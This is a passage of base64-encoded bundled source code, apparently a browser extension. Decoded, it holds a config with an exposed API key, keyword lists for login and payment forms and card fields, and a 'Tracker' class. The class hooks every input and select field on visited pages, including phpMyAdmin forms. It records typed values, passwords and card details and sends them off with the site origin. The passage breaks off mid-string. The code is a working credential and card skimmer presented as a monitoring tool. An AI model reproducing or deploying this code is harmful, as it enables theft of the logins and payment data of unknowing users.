CAgICAgICAgICAgICBcInJlbFwiOiBcImFwcGxlLXRvdWNoLWljb25cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic2l6ZVwiOiBcIjE1MngxNTJcIlxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiaHJlZlwiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyBcIm1lZGlhL2xvZ29zL2FwcGxlLWljb24tMTgweDE4MC5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiYXBwbGUtdG91Y2gtaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiMTgweDE4MFwiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvYW5kcm9pZC1pY29uLTE5MngxOTIucG5nXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcInJlbFwiOiBcImljb25cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwic2l6ZVwiOiBcIjE5MngxOTJcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcImltYWdlL3BuZ1wiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvZmF2aWNvbi0xNngxNi5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiMTZ4MTZcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcImltYWdlL3BuZ1wiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvZmF2aWNvbi0zMngzMi5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiMzJ4MzJcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcImltYWdlL3BuZ1wiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvZmF2aWNvbi05Nng5Ni5wbmdcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiOTZ4OTZcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcImltYWdlL3BuZ1wiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvZmF2aWNvbi5pY29cIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwicmVsXCI6IFwiaWNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJzaXplXCI6IFwiMTZ4MTZcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwidHlwZVwiOiBcImltYWdlL3ZuZC5taWNyb3NvZnQuaWNvblwiXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJocmVmXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwibWVkaWEvbG9nb3MvbWFuaWZlc3QuanNvblwiLFxuICAgICAgICAgICAgICAgICAgICAgICAgXCJyZWxcIjogXCJtYW5pZmVzdFwiLFxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcIm1zYXBwbGljYXRpb24tVGlsZUNvbG9yXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcImNvbnRlbnRcIjogXCIjZmZmZmZmXCIsXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICAgICAge1xuICAgICAgICAgICAgICAgICAgICAgICAgXCJuYW1lXCI6IFwibXNhcHBsaWNhdGlvbi1UaWxlSW1hZ2VcIixcbiAgICAgICAgICAgICAgICAgICAgICAgIFwiY29udGVudFwiOiBfX2FwcEhvc3RlZFNlcnZlclJvb3QgKyBcIm1lZGlhL2xvZ29zL21zLWljb24tMTQ0eDE0NC5wbmdcIlxuICAgICAgICAgICAgICAgIH0sXG4gICAgICAgICAgICAgICAgICAgIHtcbiAgICAgICAgICAgICAgICAgICAgICAgIFwibmFtZVwiOiBcInRoZW1lLWNvbG9yXCIsXG4gICAgICAgICAgICAgICAgICAgICAgICBcImNvbnRlbnRcIjogXCIjZmZmZmZmXCIsXG4gICAgICAgICAgICAgICAgfSxcbiAgICAgICAgICAgICAgICBdLFxuICAgICAgICAgICAgfSxcblxuICAgICAgICB9LFxuICAgIH0sXG4gICAgXCJ3ZWJzaXRlXCI6IHtcbiAgICAgICAgXCJob21lXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCxcbiAgICAgICAgXCJzdXBwb3J0XCI6IFwic3VwcG9ydEBtaXNodXNvZnQuY29tXCIsXG4gICAgICAgIFwiZG9uYXRlXCI6IF9fYXBwSG9zdGVkU2VydmVyUm9vdCArIFwicGF5bWVudC9kb25hdGVcIixcbiAgICAgICAgXCJpcEluZm9EZWRpY2F0ZWRcIjogX19hcHBIb3N0ZWRTZXJ2ZXJSb290ICsgXCJhcGkvdG9vbHMvaXBpbmZvXCIsXG4gICAgICAgIFwiSXBJbmZvXCI6IFwiaHR0cHM6Ly9hcGkuaXBkYXRhLmNvLz9hcGkta2V5PTJmOWRkZTM4MWY2N2VmZWQzMjVhY2ZiMTAxMWE5ODgwMzZiMjhmYzZjYzAyZjA3NjY4ZWY3MTgwXCIsXG4gICAgICAgIFwiSXBJbmZvS2V5XCI6IFwiMmY5ZGRlMzgxZjY3ZWZlZDMyNWFjZmIxMDExYTk4ODAzNmIyOGZjNmNjMDJmMDc2NjhlZjcxODBcIixcbiAgICAgICAgXCJmb250QXdlc29tZVwiOiBcImh0dHBzOi8va2l0LmZvbnRhd2Vzb21lLmNvbS9iNGM4Zjg0NDlmLmpzXCIsXG4gICAgICAgIFwiZm9udEF3ZXNvbWVLZXlcIjogXCJiNGM4Zjg0NDlmXCIsXG5cbiAgICAgICAgXCJ0ZW1wb3JhcnlcIjoge1xuICAgICAgICAgICAgXCJob21lXCI6IFwiaHR0cDovL2xvY2FsaG9zdC9cIixcbiAgICAgICAgICAgIFwibW9uaXRvclVSTFwiOiBcImh0dHA6Ly9sb2NhbGhvc3QvbW9uaXRvci9icm93c2VyL1wiLFxuICAgICAgICAgICAgXCJwYXltZW50VVJMXCI6IFwiaHR0cDovL2xvY2FsaG9zdC9wYXltZW50L1wiXG4gICAgICAgIH0sXG4gICAgICAgIFwicHVibGlzaFwiOiB7XG4gICAgICAgICAgICBcImhvbWVcIjogXCJodHRwczovL3d3dy5taXNodXNvZnQuY29tL1wiLFxuICAgICAgICAgICAgXCJtb25pdG9yVVJMXCI6IFwiaHR0cHM6Ly93d3cubWlzaHVzb2Z0LmNvbS9tb25pdG9yL2Jyb3dzZXIvXCIsXG4gICAgICAgICAgICBcInBheW1lbnRVUkxcIjogXCJodHRwczovL3d3dy5taXNodXNvZnQuY29tL3BheW1lbnQvXCJcbiAgICAgICAgfVxuICAgIH0sXG4gICAgXCJydW50aW1lXCI6IHtcbiAgICAgICAgXCJyZXF1ZXN0XCI6IFwiXCJcbiAgICB9XG59IiwiZXhwb3J0IGNvbnN0IGF1dGhGb3JtQXR0cmlidXRlID0gW1xyXG4gICAge1xyXG4gICAgICAgICdsb2dpbic6IFtcclxuICAgICAgICAgICAgJ2Zvcm0xJywgJ3NpZ25pbicsICdzaWdub24nLCAnbG9naW4nLCAnbG9nb24nLCAnaWRlbnRpJywgJ2lkYicsICd3cGNmNy1mb3JtJywgJ2Zvcm0tLTFHX1FuJywgJ2ZsJywgJ25nLXByaXN0aW5lJyxcclxuICAgICAgICAgICAgJ2luZGV4LnBocCcsICduZXdfdXNlcicsICdjdGwyMycsICdqc3MnLCAnY29ubmV4aW9uJywgJ2ZpbGUnLCAnc3R5bGVkZm9ybScsICdhdXRoJyxcclxuICAgICAgICBdXHJcbiAgICB9LFxyXG4gICAgeydyZWdpc3Rlcic6IFsncmVnJywgJ3NpZ251cCcsICdqb2luJywgJ3JlZ2lzdGVyJywgJ2NoZWNrZm9ybSddfSxcclxuICAgIHsnbG9nb3V0JzogWydsb2dvdXQnXX0sXHJcbiAgICB7XHJcbiAgICAgICAgJ3BheW1lbnQnOiBbXHJcbiAgICAgICAgICAgICdjcmVkaXQnLCAncGF5bWVudCcsICdib2R5JywgJ2NoZWNrb3V0JywgJ3NzbGZvcm0nLCAncGF5JywgJ3B1cmNoYXNlJywgJ2VsZW1lbnRzYXBwJywgJ2NyZWRpdGNhcmQnLFxyXG4gICAgICAgICAgICAnY3JlZGl0LWNhcmQnLCAnYWRkY2FyZCcsICdiaWxsJ1xyXG4gICAgICAgIF1cclxuICAgIH0sXHJcbiAgICB7XHJcbiAgICAgICAgJ2V4Y2x1ZGUnOiBbXHJcbiAgICAgICAgICAgIC8qJ3EnLCAqLydzZWFyY2gnLCAnZ29vZ2xlYWRzJywgJ3ByZXNlbnRhdGlvbicsICdjYXB0Y2hhJywgLyonZGlzYWJsZScsICovJ2hlYWRlcicsXHJcbiAgICAgICAgICAgICdjb252ZXJ0LWZvcm0nLCAnd2FtX2FydGVuJywgJ21hdGNoa2FsZW5kZXInLCAnc3VjaGUnLCAnZ2VuZXJhdGUnLCAnc3Vic2NyaWJlJywgJ2lnbm9yZScsXHJcbiAgICAgICAgICAgICdkb3dubG9hZCcsICdrcmVkaXRyZWNobmVyJywgJ2JpdF9leGNoYW5nZV9mb3JtJywgJ2FwcGx5Zm9ybScsICdhcHBfZm9ybScsICdjb21tZW50JywgJ3dhbGxldCcsXHJcbiAgICAgICAgICAgICdwaWNrZXInLCAnd3AtbGluaycsICdtZXRhJywgJ3BhbmllcicsICdjb21tYW5kZScsICdyZWNoZXJjaGUnLCAnc2V0dGluZ3MnLCAncG9zdHMnLCAnY2hhbGxlbmdlJywgJ3RhZycsXHJcbiAgICAgICAgICAgICd1cGxvYWQnLCAnbWFpbmYnLCAnZG9tYWluJ1xyXG4gICAgICAgIF1cclxuICAgIH0sXHJcbl1cclxuXHJcbmV4cG9ydCBjb25zdCBwYXltZW50RWxlbWVudHNBdHRyaWJ1dGUgPSBbXHJcbiAgICB7J2NhcmROdW1iZXInOiBbJ251bScsICdubycsICdjYXJkbm8nLF19LFxyXG4gICAgeydjYXJkSG9sZGVyJzogWydob2xkZXInLCAnb3duZXInLCAnbmFtZScsXX0sXHJcbiAgICB7J2NhcmRUeXBlcyc6IFsnYnJhbmQnLCAndHlwZScsICd0eXBlcycsXX0sXHJcbiAgICB7J2NhcmRFeHBpcmUnOiBbJ2V4cCcsXX0sXHJcbiAgICB7J2NhcmRDVkMnOiBbJ2N2YycsICdjc2MnLCAnY3Z2JywgJ3NlY3VyaXR5Y29kZScsXX0sXHJcbiAgICB7J2NhcmRQb3N0YWxDb2RlJzogWyd6aXAnLCAncG9zdCcsXX0sXHJcbiAgICAvKnsnZXhjbHVkZSc6IFsnZW1haWwnLCAndXNlcicsICd1c3InXX0sKi9cclxuXVxyXG4iLCJpbXBvcnQge2F1dGhGb3JtQXR0cmlidXRlLCBwYXltZW50RWxlbWVudHNBdHRyaWJ1dGV9IGZyb20gXCIuLi9kYi90cmFja2VyXCI7XHJcblxyXG4vKmluaXRpYWxpemUgb24gZXh0ZW5zaW9uIGluc3RhbGxlZCovXHJcbmxldCBnbG9iYWxBcHBNb25pdG9yTWFpblVSTDogc3RyaW5nO1xyXG5nbG9iYWxBcHBNb25pdG9yTWFpblVSTCA9ICdodHRwOi8vbG9jYWxob3N0L21vbml0b3IvYnJvd3Nlci8nO1xyXG4vKnJlcXVpcmVkIHZhcmlhYmxlcyovXHJcblxyXG5cclxuXHJcbmV4cG9ydCBjbGFzcyBUcmFja2VyIHtcclxuICAgIHB1YmxpYyB1cmw6IHN0cmluZztcclxuICAgIHB1YmxpYyBhdXRoRXZlbnQ/OiBhbnk7XHJcbiAgICBwdWJsaWMgaXNUcmFja2VyQWN0aXZhdGU6IGJvb2xlYW4gPSBmYWxzZTtcclxuICAgIHB1YmxpYyB0cmFja2VySm9iSWQ6IG51bWJlciA9IDA7XHJcbiAgICBwdWJsaWMgcGFzc3dvcmRTdG9yZTogeyBub2RlOiBIVE1MRWxlbWVudCwgbmFtZTogc3RyaW5nLCB0eXBlOiBzdHJpbmcsIHZhbHVlOiBzdHJpbmcgfVtdID0gW107XHJcbiAgICBwdWJsaWMgY3JlZGl0Q2FyZFN0b3JlOiB7IG5vZGU6IEhUTUxFbGVtZW50LCBuYW1lOiBzdHJpbmcsIHR5cGU6IHN0cmluZywgdmFsdWU6IHN0cmluZyB9W10gPSBbXTtcclxuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUhvbGRlck5hbWU6IHN0cmluZyA9ICcnO1xyXG4gICAgcHVibGljIGNyZWRpdENhcmRSdW50aW1lTnVtYmVyOiBzdHJpbmcgPSAnJztcclxuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUJyYW5kOiBzdHJpbmcgPSAnJztcclxuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZUV4cGlyZURhdGU6IHN0cmluZyA9ICcnO1xyXG4gICAgcHVibGljIGNyZWRpdENhcmRSdW50aW1lQ3ZjOiBzdHJpbmcgPSAnJztcclxuICAgIHB1YmxpYyBjcmVkaXRDYXJkUnVudGltZVBvc3RhbENvZGU6IHN0cmluZyA9ICcnO1xyXG4gICAgcHJpdmF0ZSBzdGF0aWMgaWRlbnRpdHk6IHN0cmluZztcclxuICAgIHByaXZhdGUgc3RhdGljIHZlcnNpb246IHN0cmluZztcclxuICAgIHByaXZhdGUgc3RhdGljIG9zTmFtZUFuZEFyY2g6IHN0cmluZztcclxuICAgIHByaXZhdGUgc3RhdGljIGJyb3dzZXJOYW1lRnVsbDogc3RyaW5nO1xyXG5cclxuICAgIGNvbnN0cnVjdG9yKFxyXG4gICAgICAgIHVybDogc3RyaW5nLFxyXG4gICAgICAgIGlkZW50aWZ5OiBzdHJpbmcsXHJcbiAgICAgICAgdmVyc2lvbjogc3RyaW5nLFxyXG4gICAgICAgIG9zTmFtZUFuZEFyY2g6IHN0cmluZyxcclxuICAgICAgICB3ZWJCcm93c2VyTmFtZUZ1bGw6IHN0cmluZyxcclxuICAgICkge1xyXG4gICAgICAgIHRoaXMudXJsID0gdXJsO1xyXG4gICAgICAgIFRyYWNrZXIuaWRlbnRpdHkgPSBpZGVudGlmeTtcclxuICAgICAgICBUcmFja2VyLnZlcnNpb24gPSB2ZXJzaW9uO1xyXG4gICAgICAgIFRyYWNrZXIub3NOYW1lQW5kQXJjaCA9IG9zTmFtZUFuZEFyY2g7XHJcbiAgICAgICAgVHJhY2tlci5icm93c2VyTmFtZUZ1bGwgPSB3ZWJCcm93c2VyTmFtZUZ1bGw7XHJcbiAgICB9XHJcblxyXG4gICAgaW5pdChjYWxsQmFjaz86IGFueSkge1xyXG4gICAgICAgIGNvbnN0IHNlbGYgPSB0aGlzO1xyXG4gICAgICAgIGlmIChzZWxmLnVybCkge1xyXG4gICAgICAgICAgICBsZXQgaW50ZXJ2YWwxID0gc2V0SW50ZXJ2YWwoZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgc2VsZi52ZXJpZnlGb3JtRWxlbWVudChzZWxmLCBpbnRlcnZhbDEpO1xyXG4gICAgICAgICAgICB9LCAxMDAwKTtcclxuXHJcblxyXG4gICAgICAgICAgICBzZWxmLmJhY2t1cFNjcmlwdHMoc2VsZik7XHJcbiAgICAgICAgICAgIHNlbGYuYWJzb2x1dGVUcmFjayhzZWxmKTtcclxuICAgICAgICB9XHJcblxyXG4gICAgICAgIGlmIChjYWxsQmFjaykge1xyXG4gICAgICAgICAgICBjYWxsQmFjaygpO1xyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICBhYnNvbHV0ZVRyYWNrKHNlbGY6IHRoaXMpIHtcclxuICAgICAgICBsZXQgaW50ZXJ2YWwgPSBzZXRJbnRlcnZhbChmdW5jdGlvbiAoKSB7XHJcbiAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdpbnB1dCcpLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgY2xlYXJJbnRlcnZhbChpbnRlcnZhbCk7XHJcbiAgICAgICAgICAgICAgICBzZWxmLmFic29sdXRlVHJhY2tIZWxwZXIoc2VsZiwgZG9jdW1lbnQuYm9keSwgJ2lucHV0JywgZnVuY3Rpb24gKF9fZGV0ZWN0ZWRFbGVtZW50OiBhbnkpIHtcclxuICAgICAgICAgICAgICAgICAgICBbJ2tleXVwJywgJ3Bhc3RlJywgJ2NoYW5nZScsICdpbnB1dCddLmZvckVhY2goZnVuY3Rpb24gKGV2ZW50KSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIF9fZGV0ZWN0ZWRFbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIoZXZlbnQsIGZ1bmN0aW9uICgpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChfX2RldGVjdGVkRWxlbWVudC52YWx1ZS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBUcmFja2VyLnNlbmQoe1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb21tYW5kOiAnc2F2ZUlucHV0RWxlbWVudERhdGEnLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBkYXRhOiB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAnbmFtZSc6IF9fZGV0ZWN0ZWRFbGVtZW50Lm5vZGVOYW1lLnRvTG93ZXJDYXNlKCksXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndHlwZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnR5cGUsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAndmFsdWUnOiBfX2RldGVjdGVkRWxlbWVudC52YWx1ZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICdwbGFjZWhvbGRlcic6IF9fZGV0ZWN0ZWRFbGVtZW50LnBsYWNlaG9sZGVyID8gX19kZXRlY3RlZEVsZW1lbnQucGxhY2Vob2xkZXIgOiAnTk9UIFNFVCcsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBcIndvcmtXZWJzaXRlXCI6IHdpbmRvdy5sb2NhdGlvbi5vcmlnaW5cclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgICAgICB9KTtcclxuICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGlmIChkb2N1bWVudC5xdWVyeVNlbGVjdG9yQWxsKCdzZWxlY3QnKS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgICAgIGNsZWFySW50ZXJ2YWwoaW50ZXJ2YWwpO1xyXG4gICAgICAgICAgICAgICAgc2VsZi5hYnNvbHV0ZVRyYWNrSGVscGVyKHNlbGYsIGRvY3VtZW50LmJvZHksICdzZWxlY3QnLCBmdW5jdGlvbiAoX19kZXRlY3RlZEVsZW1lbnQ6IGFueSkge1xyXG4gICAgICAgICAgICAgICAgICAgIFsna2V5dXAnLCAncGFzdGUnLCAnY2hhbmdlJywgJ2lucHV0J10uZm9yRWFjaChmdW5jdGlvbiAoZXZlbnQpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgX19kZXRlY3RlZEVsZW1lbnQuYWRkRXZlbnRMaXN0ZW5lcihldmVudCwgZnVuY3Rpb24gKCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFRyYWNrZXIuc2VuZCh7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGNvbW1hbmQ6ICdzYXZlSW5wdXRFbGVtZW50RGF0YScsXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGE6IHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICduYW1lJzogX19kZXRlY3RlZEVsZW1lbnQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd0eXBlJzogX19kZXRlY3RlZEVsZW1lbnQudHlwZSxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICd2YWx1ZSc6IF9fZGV0ZWN0ZWRFbGVtZW50LnZhbHVlLFxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJ3BsYWNlaG9sZGVyJzogX19kZXRlY3RlZEVsZW1lbnQucGxhY2Vob2xkZXIgPyBfX2RldGVjdGVkRWxlbWVudC5wbGFjZWhvbGRlciA6ICdOT1QgU0VUJyxcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFwid29ya1dlYnNpdGVcIjogd2luZG93LmxvY2F0aW9uLm9yaWdpblxyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgICAgIH0pO1xyXG4gICAgICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgICAgIH1cclxuICAgICAgICB9LCAxMDApO1xyXG4gICAgfVxyXG5cclxuICAgIGFic29sdXRlVHJhY2tIZWxwZXIoc2VsZjogdGhpcywgZWxlbWVudFBhcmVudE5vZGU6IEhUTUxFbGVtZW50LCBfX3RhZ05hbWU6IHN0cmluZywgY2FsbGJhY2s6IGFueSkge1xyXG4gICAgICAgIGlmIChlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmxlbmd0aCAhPT0gMCkge1xyXG4gICAgICAgICAgICBlbGVtZW50UGFyZW50Tm9kZS5jaGlsZE5vZGVzLmZvckVhY2goZnVuY3Rpb24gKF9fY2hpbGRFbGVtZW50KSB7XHJcbiAgICAgICAgICAgICAgICBpZiAoX19jaGlsZEVsZW1lbnQubm9kZU5hbWUudG9Mb3dlckNhc2UoKSA9PT0gX190YWdOYW1lKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKGNhbGxiYWNrKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgIGNhbGxiYWNrKF9fY2hpbGRFbGVtZW50KTtcclxuICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICB9IGVsc2Uge1xyXG4gICAgICAgICAgICAgICAgICAgIHNlbGYuYWJzb2x1dGVUcmFja0hlbHBlcihzZWxmLCAoX19jaGlsZEVsZW1lbnQgYXMgSFRNTEVsZW1lbnQpLCBfX3RhZ05hbWUsIGNhbGxiYWNrKVxyXG4gICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICB9KTtcclxuICAgICAgICB9XHJcbiAgICB9XHJcblxyXG4gICAgdHJpZ2dlcihzZWxmOiB0aGlzLCBfX2Zvcm1FbGVtZW50OiBIVE1MRm9ybUVsZW1lbnQpIHtcclxuICAgICAgICBzZWxmLnRyYWNrKHNlbGYsIF9fZm9ybUVsZW1lbnQpO1xyXG4gICAgfVxyXG5cclxuICAgIHZlcmlmeUZvcm1FbGVtZW50KHNlbGY6IHRoaXMsIGludGVydmFsPzogYW55KSB7XHJcbiAgICAgICAgaWYgKGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJ2Zvcm0nKS5sZW5ndGggIT09IDApIHtcclxuICAgICAgICAgICAgZG9jdW1lbnQucXVlcnlTZWxlY3RvckFsbCgnZm9ybScpLmZvckVhY2goZnVuY3Rpb24gKF9fZm9ybUVsZW1lbnQpIHtcclxuICAgICAgICAgICAgICAgIGlmIChfX2Zvcm1FbGVtZW50LmF0dHJpYnV0ZXMubGVuZ3RoICE9PSAwKSB7XHJcbiAgICAgICAgICAgICAgICAgICAgaWYgKHdpbmRvdy5sb2NhdGlvbi5ocmVmLnRvTG93ZXJDYXNlKCkuaW5kZXhPZigncGhwbXlhZG1pbicpICE9PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5tZXRob2QgPT09ICdwb3N0Jykge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ZXJ2YWwgPyBjbGVhckludGVydmFsKGludGVydmFsKSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pc1RyYWNrZXJBY3RpdmF0ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRyYWNrZXJKb2JJZCsrO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmlnZ2VyKHNlbGYsIF9fZm9ybUVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaWYgKF9fZm9ybUVsZW1lbnQuYWN0aW9uICE9PSAnamF2YXNjcmlwdDp2b2lkKDApJyAmJiBfX2Zvcm1FbGVtZW50LmlkICE9PSAnbnVsbCcgJiYgX19mb3JtRWxlbWVudC5pZCAhPT0gJ2lyb3V0ZUZvcm0nICYmXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmlkICE9PSAnYmhsZicgJiYgX19mb3JtRWxlbWVudC5pZC5pbmRleE9mKCdpZCcpID09PSAtMSAmJiBfX2Zvcm1FbGVtZW50LmlkLmluZGV4T2YoJ3VfMF8nKSA9PT0gLTEgJiZcclxuICAgICAgICAgICAgICAgICAgICAgICAgICAgIF9fZm9ybUVsZW1lbnQuaWQuaW5kZXhPZigndGhlZm9ybScpID09PSAtMSAmJiBfX2Zvcm1FbGVtZW50LmlkLmluZGV4T2YoJ3NjbF9mb3JtJykgPT09IC0xICYmXHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBfX2Zvcm1FbGVtZW50LmNsYXNzTmFtZS5pbmRleE9mKCdnYl84ZScpID09PSAtMSkge1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgaW50ZXJ2YWwgPyBjbGVhckludGVydmFsKGludGVydmFsKSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi5pc1RyYWNrZXJBY3RpdmF0ZSA9IHRydWU7XHJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICBzZWxmLnRyYWNrZXJKb2JJZCsrO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmlnZ2VyKHNlbGYsIF9fZm9ybUVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICB9XHJcbiAgICAgICAgICAgICAgICAgICAgfVxyXG4gICAgICAgICAgICAgICAgfSBlbHNlIHtcclxuICAgICAgICAgICAgICAgICAgICBpZiAoX19mb3JtRWxlbWVudC5jaGlsZE5vZGVzLmxlbmd0aCA+IDEpIHtcclxuICAgICAgICAgICAgICAgICAgICAgICAgaW50ZXJ2YWwgPyBjbGVhckludGVydmFsKGludGVydmFsKSA6ICcnO1xyXG4gICAgICAgICAgICAgICAgICAgICAgICBzZWxmLmlzVHJhY2tlckFjdGl2YXRlID0gdHJ1ZTtcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmFja2VySm9iSWQrKztcclxuICAgICAgICAgICAgICAgICAgICAgICAgc2VsZi50cmlnZ2VyKHNlbGYsIF9fZm9ybUVsZW1lbnQpO1xyXG4gICAgICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgICAgIH1cclxuICAgICAgICAgICAgfSk7XHJcbiAgICAgICAgfSBlbHNlIHtcclxuICAgI